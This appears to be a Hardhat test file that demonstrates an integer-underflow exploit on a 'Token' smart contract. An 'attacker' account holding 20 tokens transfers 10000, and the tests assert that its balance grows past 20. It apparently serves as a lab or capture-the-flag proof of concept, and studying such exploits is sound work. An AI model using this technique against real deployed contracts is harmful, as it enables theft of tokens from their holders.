const { expect } = require("chai");
const { ethers } = require("hardhat");
require("dotenv").config();

describe("Token", () => {
    let deployer;
    let token;

    beforeEach(async () => {
        // Setup accounts
        [deployer, attacker, receiver] = await ethers.getSigners();

        const Token = await ethers.getContractFactory("Token");
        token = await Token.deploy('21000000');

        token.connect(deployer).transfer(attacker.address, '20');
    })

    describe("Token Contract", () => {
        it('has a total supply', async () => {
            const result = await token.connect(deployer).totalSupply();
            expect(result).to.equal(21000000);
        })

        it('returns a balance of for a user', async () => {
            const result = await token.connect(attacker).balanceOf(attacker.address);
            expect(result).to.equal(20);
        })
    })

    describe("Token Contract Attack", () => {
        beforeEach(async () => {
            const transaction = await token.connect(attacker).transfer(token.address, "10000");
            await transaction.wait();
        })

        it('returns a balance for attacker', async () => {
            const result = await token.connect(attacker).balanceOf(attacker.address);
            console.log(`Attacker Balance after transfer: ${result.toString()}\n`);

            expect(result).to.be.greaterThan(20);
        })

        it('returns a balance for receiver', async () => {
            const result = await token.connect(attacker).balanceOf(token.address);
            console.log(`Receiver Balance after transfer: ${result.toString()}\n`);

            expect(result).to.equal(10000);
        })
    })
})
